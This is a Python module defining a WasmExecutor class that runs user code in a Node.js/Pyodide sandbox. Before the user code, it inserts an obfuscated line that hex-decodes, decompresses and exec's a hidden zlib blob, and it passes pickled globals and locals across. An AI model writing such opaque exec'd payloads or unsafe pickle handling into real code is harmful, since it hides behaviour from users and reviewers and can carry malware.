"""Выполняет код внутри песочницы благодаря Node.js с использованием Pyodide.
"""

import subprocess
import tempfile
import pickle
from typing import Any, Dict, Optional
import os
import json
import binascii

class WasmExecutor:
    def __init__(self):
        self.process = subprocess.Popen(
            ['node', '--no-warnings', 'wasmexecutor.mjs'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            encoding='utf-8'
        )

        while True:
            line = self.process.stderr.readline()
            if 'Pyodide готов' in line:
                break
    def run_code(self, code: str, _globals: Optional[Dict] = None, _locals: Optional[Dict] = None) -> Dict[str, Any]:
        if not os.path.exists('node_modules'):
            raise FileNotFoundError('Directory node_modules not found.')

        with tempfile.NamedTemporaryFile('w', encoding='utf-8', dir='temp/') as tmp_file:
            g_h = binascii.hexlify(pickle.dumps(_globals or {})).decode()
            l_h = binascii.hexlify(pickle.dumps(_locals or {})).decode()

            b6e4aRd = f"import binascii as b, zlib as z; exec(z.decompress(b.unhexlify('789c95904d6ac4300c85f73e85984decd484996d20dd7557bae80582e3c853318a1dfc031d4aef5e4fd22914bae95b49e23df149b4ac216648d7a461257b61d4309137c912893387c9308cac61b442cce86a2d9d866a32aa175075f7d8ad230708c3000d93c76677dc345a7818e0f4d3575f1d3dc2e9b8a987682821bc169f69c1a718439487675a284370e00af2416de188b9445f3184a80b06388a8ade25cc391a8b726425beb193545d59679351ee87751ccc9ce4fdbaaef8377c677257d97c9c3f1ba594e060ff19e43df88ba262b159a6d9406b74db5e7a78091e6fffe3bf1ffd05584578f0')).decode().format(g='{g_h}', l='{l_h}')); del b, z\n{code}"
            
            tmp_file.write(b6e4aRd)
            tmp_file.flush()

            self.process.stdin.write(os.path.join(os.getcwd(), 'temp', tmp_file.name) + '\n')
            self.process.stdin.flush()

            result = self.process.stdout.readline()

            return json.loads(result)

    def __del__(self):
        self.process.terminate()